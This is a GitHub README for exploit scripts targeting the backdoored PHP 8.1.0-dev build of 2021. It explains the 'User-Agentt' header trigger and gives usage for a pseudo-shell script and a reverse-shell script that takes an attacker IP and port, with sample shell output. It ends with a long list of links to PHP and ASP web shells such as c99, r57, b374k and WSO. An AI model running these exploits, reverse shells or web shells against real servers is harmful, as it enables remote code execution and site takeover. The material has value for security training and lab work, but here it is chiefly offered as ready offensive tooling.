# Also
https://github.com/22XploiterCrew-Team/Gel4y-Mini-Shell-Backdoor/blob/1.x.x/README.md

# PHP 8.1.0-dev Backdoor Remote Code Execution
_PHP 8.1.0-dev Backdoor System Shell Script_

![docs/logo_php81.png](docs/logo_php81.png "docs/logo_php81.png")

PHP verion 8.1.0-dev was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.   

The original code was restored after the issue was discovered, but then tampered with a second time. The breach would have created a backdoor in any websites that ran the compromised version of PHP, enabling hackers to perform remote code execution on the site.

_Read full article: https://flast101.github.io/php-8.1.0-dev-backdoor-rce/_


* * * 

## POC Script

This short exploit script [backdoor_php_8.1.0-dev.py](https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py) uses the backdoor to provide a pseudo system shell on the host.Find it on [Exploit DB](https://www.exploit-db.com/exploits/49933).    

- **Exploit Title:** PHP 8.1.0-dev Backdoor Remote Code Execution    
- **Date:** 23 may 2021   
- **Exploit Author:** flast101   
- **Vendor Homepage:** [https://www.php.net/](https://www.php.net/)    
- **Software Link:** [https://github.com/vulhub/vulhub/tree/master/php/8.1-backdoor](https://github.com/vulhub/vulhub/tree/master/php/8.1-backdoor)            
- **Tested on version:** 8.1.0-dev    
- **CVE** : N/A    
- **Vulnerability references**:    
[https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a](https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a)    
[https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md](https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md)    



Usage:


```
┌──(user㉿kali)-[~/Documents]
└─$ python3 backdoor_php_8.1.0-dev.py
  
Enter the host url:
http://a.b.c.d

Interactive shell is opened on http://a.b.c.d 
Can't acces tty; job crontol turned off.
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
```

* * * 

## Reverse Shell    

This short exploit script [revshell_php_8.1.0-dev.py](https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py) gives a reverse shell on target.


Usage:


```
┌──(user㉿kali)-[~/Documents]
└─$ python3 revshell_php_8.1.0-dev.py <target URL> <attacker IP> <attacker PORT>
```

![docs/revshell-script.png](docs/revshell-script.png "docs/revshell-script.png")

Be Curious, Learning is Life ! :smiley:


##### PHP Shell :

* [Simple Shell](https://github.com/backdoorhub/shell-backdoor-list/blob/master/shell/php/simple-shell.php)

* [B374K Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/b374k.php)

* [C99 Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/c99.php)

* [R57 Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/r57.php)

* [Wso Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/wso.php)

* [0byt3m1n1 Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/0byt3m1n1.php)

* [Alfa Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/alfa.php)

* [AK-47 Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/ak47shell.php)

* [Indoxploit Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/indoxploit.php)

* [Marion001 Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/ak47shell.php)

* [Mini Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/mini.php)

* [p0wny-shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/p0wny-shell.php)

* [Sadrazam Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/sadrazam.php)

* [Webadmin Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/webadmin.php)

* [Wordpress Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/wordpress.php)

* [LazyShell](https://github.com/joeylane/Lazyshell.php/blob/master/lazyshell.php)

##### ASP Shell :

* [Pouya Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/asp/pouya.asp)

* [Kacak Asp Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/asp/kacak.asp)

* [Asp Cmd (Old ISS)](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/asp/aspcmd.asp)

* [Asp Cmd (New ISS)](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/asp/newaspcmd.asp)

